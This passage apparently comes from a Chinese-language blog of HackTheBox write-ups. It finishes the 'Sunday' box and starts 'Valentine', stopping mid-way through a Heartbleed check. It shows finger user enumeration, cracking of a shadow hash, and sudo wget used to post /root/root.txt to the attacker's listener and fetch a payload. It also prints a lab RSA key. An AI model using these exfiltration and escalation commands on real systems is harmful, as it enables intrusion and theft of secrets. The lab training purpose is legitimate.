no session was created. 这边是失败了，我们去看看有没有其他脚本 msf6 exploit(bsd/finger/morris_fingerd_bof) &gt; search finger Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/rdp/cve_2019_0708_bluekeep_rce 2019-05-14 manual Yes CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free 1 auxiliary/scanner/finger/finger_users normal No Finger Service User Enumerator 2 auxiliary/server/browser_autopwn normal No HTTP Client Automatic Exploiter 3 exploit/bsd/finger/morris_fingerd_bof 1988-11-02 normal Yes Morris Worm fingerd Stack Buffer Overflow 4 auxiliary/gather/mybb_db_fingerprint 2014-02-13 normal Yes MyBB Database Fingerprint 5 exploit/windows/http/bea_weblogic_post_bof 2008-07-17 great Yes Oracle Weblogic Apache Connector POST Request Buffer Overflow 6 auxiliary/scanner/oracle/isqlplus_login normal No Oracle iSQL*Plus Login Utility 7 auxiliary/scanner/oracle/isqlplus_sidbrute normal No Oracle iSQLPlus SID Check 8 post/windows/gather/enum_putty_saved_sessions normal No PuTTY Saved Sessions Enumeration Module 9 auxiliary/scanner/smb/smb_version normal No SMB Version Detection 10 auxiliary/scanner/vmware/esx_fingerprint normal No VMWare ESX/ESXi Fingerprint Scanner Interact with a module by name or index. For example info 10, use 10 or use auxiliary/scanner/vmware/esx_fingerprint 这里有一个扫描用户名的 auxiliary&#x2F;scanner&#x2F;finger&#x2F;finger_users，去尝试一下 msf6 auxiliary(scanner/finger/finger_users) &gt; show options Module options (auxiliary/scanner/finger/finger_users): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.76 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 79 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) USERS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt yes The file that contains a list of default UNIX accounts. msf6 auxiliary(scanner/finger/finger_users) &gt; exploit [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: adm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: ikeuser [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: lp [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: dladm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: netadm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: netcfg [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: dhcpserv [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: bin [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: daemon [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: ftp [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: noaccess [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: nobody [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: nobody4 [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: root [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: sshd [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: sys [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: aiuser [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: openldap [+] 10.10.10.76:79 - 10.10.10.76:79 Users found: adm, aiuser, bin, daemon, dhcpserv, dladm, ftp, ikeuser, lp, netadm, netcfg, noaccess, nobody, nobody4, openldap, root, sshd, sys [*] 10.10.10.76:79 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 漏洞利用这个似乎不好用，我去找到了一个脚本 https://github.com/pentestmonkey/finger-user-enum.git 然后再执行试试 ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 | less -S Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Worker Processes ......... 5 Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt Target count ............. 1 Username count ........... 10177 Target TCP port .......... 79 Query timeout ............ 5 secs Relay Server ............. Not used ######## Scan started at Thu Apr 14 01:51:49 2022 ######### access@10.10.10.76: access No Access User &lt; . . . . &gt;..nobody4 SunOS 4.x NFS Anonym &lt; . . . . &gt;.. admin@10.10.10.76: Login Name TTY Idle When Where..adm Admin &lt; . . . . &gt;..dladm Datalink Admin &lt; . . . . &gt;..netadm&gt; bin@10.10.10.76: bin ??? &lt; . . . . &gt;.. dee dee@10.10.10.76: Login Name TTY Idle When Where..dee ???..dee ???.. ike@10.10.10.76: ikeuser IKE Admin &lt; . . . . &gt;.. jo ann@10.10.10.76: Login Name TTY Idle When Where..ann ???..jo ???.. la verne@10.10.10.76: Login Name TTY Idle When Where..la ???..verne ???.. line@10.10.10.76: Login Name TTY Idle When Where..lp Line Printer Admin &lt; . . . . &gt;.. message@10.10.10.76: Login Name TTY Idle When Where..smmsp SendMail Message Sub &lt; . . . . &gt;.. miof mela@10.10.10.76: Login Name TTY Idle When Where..mela ???..miof ???.. root@10.10.10.76: root Super-User console &lt;Dec 19 10:30&gt;.. sammy@10.10.10.76: sammy ??? console &lt;Dec 19 08:35&gt;.. sunny@10.10.10.76: sunny ??? console &lt;Dec 19 09:56&gt;.. sys@10.10.10.76: sys ??? &lt; . . . . &gt;.. zsa zsa@10.10.10.76: Login Name TTY Idle When Where..zsa ???..zsa ???.. ######## Scan completed at Thu Apr 14 02:29:46 2022 ######### 15 results. 10177 queries in 2277 seconds (4.5 queries / sec) 这里有三个用户不一样，都有登录信息。分别是 root、sammy、sunny 根据靶机图像和名字判断，账户应该是 sunny，密码可能是 sunday ┌──(root💀lucifiel)-[/home/lucifiel/Desktop] └─# ssh -p 22022 sunny@10.10.10.76 The authenticity of host &#39;[10.10.10.76]:22022 ([10.10.10.76]:22022)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;[10.10.10.76]:22022&#39; (ED25519) to the list of known hosts. Password: Warning: 4 failed authentication attempts since last successful authentication. The latest at Thu Apr 14 06:59 2022. Last login: Sun Dec 19 09:56:51 2021 on console Oracle Corporation SunOS 5.11 11.4 Aug 2018 sunny@sunday:~$ whoami&amp;&amp;id sunny uid=101(sunny) gid=10(staff) 成功进入 user 权限 sunny@sunday:/home/sammy$ cat user.txt a3d9498027ca5187ba1793943ee8a598 成功拿到 user 权限的 flag 文件 权限提升sunny@sunday:/home/sammy$ sudo -l 用户 sunny 可以在 sunday 上运行以下命令： (root) NOPASSWD: /root/troll 使用 sudo -l 查看了一下权限，发现可以使用 root 权限运行 &#x2F;root&#x2F;troll 运行一下看看 sunny@sunday:/home/sammy$ sudo /root/troll sudo: /root/troll：找不到命令 提示找不到？那找找其他路子 sunny@sunday:/backup$ ls agent22.backup shadow.backup sunny@sunday:/backup$ cat shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::: 在目录 &#x2F;backup 中找到了一个 shadow.backup 的文件，拿到了一串hash，去尝试爆破一下 echo $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB &gt; hash 然后开始爆破 ┌──(root💀kali)-[~/Desktop] └─# hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 2878/2942 MB (1024 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 65 MB Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude! Session..........: hashcat Status...........: Cracked Hash.Name........: sha256crypt $5$, SHA256 (Unix) Hash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB Time.Started.....: Thu Apr 14 21:29:17 2022 (2 mins, 59 secs) Time.Estimated...: Thu Apr 14 21:32:16 2022 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1145 H/s (13.57ms) @ Accel:128 Loops:128 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 203776/14344385 (1.42%) Rejected.........: 0/203776 (0.00%) Restore.Point....: 203264/14344385 (1.42%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000 Candidates.#1....: dadof3 -&gt; chs2009 Started: Thu Apr 14 21:28:48 2022 Stopped: Thu Apr 14 21:32:17 2022 得到了密码 username = sammy password = cooldude! 去登录一下 sunny@sunday:~$ su sammy Password: sammy@sunday:~$ whoami&amp;&amp;id sammy uid=100(sammy) gid=10(staff) sammy@sunday:~$ sudo -l 用户 sammy 可以在 sunday 上运行以下命令： (ALL) ALL (root) NOPASSWD: /usr/bin/wget 使用 sudo -l 查看一下权限，发现可以使用 root 权限运行 wget，那就好办了 有方案了 然后使用 wget 的 –post-file 拿我们要的文件 sudo wget --post-file=/root/root.txt 10.10.14.2 sudo wget http://10.10.14.7/payload.sh -o /root/troll 然后回到 sunny 用户，使用 sudo &#x2F;root&#x2F;troll 执行 sudo /root/troll 使用 nc 监听一个端口后，再执行这条命令 nc -nvlp 80 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.76] 59151 POST / HTTP/1.1 User-Agent: Wget/1.19.5 (solaris2.11) Accept: */* Accept-Encoding: identity Host: 10.10.14.2 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 33 fb40fab61d99d37536daeec0d97af9b8 成功获得 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Valentine - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Valentine","date":"2022-04-12T11:38:36.000Z","updated":"2023-06-13T03:54:41.000Z","comments":true,"path":"2022/04/12/Hackthebox/Easy/Hackthebox-Valentine/","link":"","permalink":"http://www.lucifiel.com/2022/04/12/Hackthebox/Easy/Hackthebox-Valentine/","excerpt":"","text":"Hackthebox - Valentine靶场信息 靶场类型 信息收集Nmap┌──(root💀lucifiel)-[/home/lucifiel] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.79 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-12 14:15 CST Nmap scan report for 10.10.10.79 Host is up (0.14s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA) | 2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA) |_ 256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Not valid before: 2018-02-06T00:45:25 |_Not valid after: 2019-02-06T00:45:25 |_ssl-date: 2022-04-12T06:19:55+00:00; +3m16s from scanner time. No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/12%OT=22%CT=1%CU=37713%PV=Y%DS=2%DC=T%G=Y%TM=6255194 OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OPS OS:(O1=M505ST11NW4%O2=M505ST11NW4%O3=M505NNT11NW4%O4=M505ST11NW4%O5=M505ST1 OS:1NW4%O6=M505ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN OS:(R=Y%DF=Y%T=40%W=3908%O=M505NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M505ST11NW4%RD= OS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S= OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: 3m15s TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 140.62 ms 10.10.14.1 2 140.81 ms 10.10.10.79 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.93 seconds Http 没看到有什么特别的，去做个 fuzz Fuzz┌──(root💀lucifiel)-[/home/lucifiel] └─# gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.79/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/12 14:23:09 Starting gobuster in directory enumeration mode =============================================================== /index (Status: 200) [Size: 38] /dev (Status: 301) [Size: 308] [--&gt; http://10.10.10.79/dev/] /encode (Status: 200) [Size: 554] /decode (Status: 200) [Size: 552] /omg (Status: 200) [Size: 153356] /server-status (Status: 403) [Size: 292] =============================================================== 2022/04/12 14:26:56 Finished =============================================================== 这里有一个 &#x2F;dev 目录，去查看一下 &#x2F;dev 中有两个文件 hype_key 和 notes.txt 去分别查看一下 notes.txt To do: 1) Coffee. 2) Research. 3) Fix decoder/encoder before going live. 4) Make sure encoding/decoding is only done client-side. 5) Don&#39;t use the decoder/encoder until any of this is done. 6) Find a better way to take notes. hype_key 2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 这里拿到了一串二进制编码和一个提示 提示中暗示我们可以解码这堆编码，那就去试试吧 漏洞利用首先解密一下这堆编码 ┌──(root💀lucifiel)-[/home/lucifiel] └─# curl http://10.10.10.79/dev/hype_key|xxd -r -p % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 5383 100 5383 0 0 18954 0 --:--:-- --:--:-- --:--:-- 18887 -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- 这里拿到了一个 ssh 私钥，根据文件格式，猜测出用户名是 hype，去尝试登录 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Valentine] └─# ssh hype@10.10.10.79 -i id_rsa The authenticity of host &#39;10.10.10.79 (10.10.10.79)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.79&#39; (ECDSA) to the list of known hosts. @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for &#39;id_rsa&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key &quot;id_rsa&quot;: bad permissions hype@10.10.10.79&#39;s password: 登录失败，再找找其他路子 心脏滴血由于没有思路了，再回过头来看看之前的，看着首页的图片，似乎像是心脏滴血，去检测一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Valentine] └─# nmap --script=ssl-heartbleed 10.10.10.79 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-12 02:59 EDT Nmap scan report for 10.10.10.79 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the 